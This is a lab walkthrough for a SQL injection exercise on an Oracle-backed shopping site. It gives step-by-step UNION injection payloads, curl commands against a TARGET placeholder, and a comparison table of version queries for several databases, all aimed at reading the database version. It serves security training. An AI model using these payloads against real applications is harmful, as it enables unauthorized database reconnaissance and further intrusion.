# SQL injection attack, querying the database type and version on Oracle — Practitioner

**Status:** Solved

---

## Goal

Determine the Oracle database version by exploiting a SQL injection vulnerability. Display the version information on the page.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Determine the number of columns**
   - Remember: Oracle requires `FROM dual` for queries without a real table
```
   Gifts' UNION SELECT NULL FROM dual--
   Gifts' UNION SELECT NULL,NULL FROM dual--
```
   - Let's say it has 2 columns

3. **Find text-compatible columns**
   - Test each column for string support:
```
   Gifts' UNION SELECT 'abc',NULL FROM dual--
   Gifts' UNION SELECT NULL,'abc' FROM dual--
```
   - Identify which column(s) can display text

4. **Query Oracle version information**
   - Oracle stores version in `v$version` system view
   - The `banner` column contains version string
   - Use UNION to retrieve it:
```
   Gifts' UNION SELECT banner,NULL FROM v$version--
```
   - Or if column 1 is text-compatible:
```
   Gifts' UNION SELECT NULL,banner FROM v$version--
```

5. **Execute the injection**
   
   If column 1 accepts text:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version--"
```
   
   If column 2 accepts text:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,banner+FROM+v$version--"
```

6. **Verify the version appears**
   - Look at the page output
   - You'll see something like:
     - "Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production"
     - "PL/SQL Release 11.2.0.1.0 - Production"
     - "CORE 11.2.0.1.0 Production"
   - The version string is displayed on the page

7. **Lab completion**
   - Lab solves automatically once version info is displayed
   - You've successfully queried Oracle system tables

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column count: 2 columns
- Column 2 accepts text

Payload:
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,banner+FROM+v$version--"
```

Output on page:
```
Product: Laptop - $999
Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
PL/SQL Release 11.2.0.1.0 - Production
CORE 11.2.0.1.0 Production
Product: Mouse - $20
```

---

## Oracle-specific details

**v$version system view:**
- Contains database version information
- Multiple rows with different components
- `banner` column has human-readable version strings
- Accessible without special privileges

**Other Oracle version queries:**
- `SELECT * FROM v$version` - All version info
- `SELECT banner FROM v$version WHERE rownum=1` - Just first row
- `SELECT version FROM v$instance` - Short version number

**Why FROM dual is required:**
- Oracle enforces strict SQL syntax
- Every SELECT must have a FROM clause
- `dual` is a dummy table with exactly one row
- Built into every Oracle database
- Perfect for queries that don't need real tables

**Common Oracle system views:**
- `v$version` - Database version
- `v$database` - Database info
- `all_tables` - All accessible tables
- `all_tab_columns` - All accessible columns
- `user_tables` - Tables owned by current user

---

## Why this works

System views like `v$version` are designed to provide database metadata and are accessible to most database users. By combining UNION injection with Oracle's system views, we can extract sensitive information about the database configuration. Knowing the database version helps attackers identify known vulnerabilities, plan further attacks, and understand the database's capabilities and limitations.

---

## Key differences from other databases

| Feature | Oracle | MySQL | PostgreSQL | MSSQL |
|---------|--------|-------|------------|-------|
| **Version query** | `banner FROM v$version` | `@@version` | `version()` | `@@version` |
| **Dummy table** | `FROM dual` required | Not needed | Not needed | Not needed |
| **Comment** | `--` | `#` or `--` | `--` | `--` |
| **String concat** | `||` | `CONCAT()` | `||` | `+` |

---

**SQLi Lab 11 Complete ✓**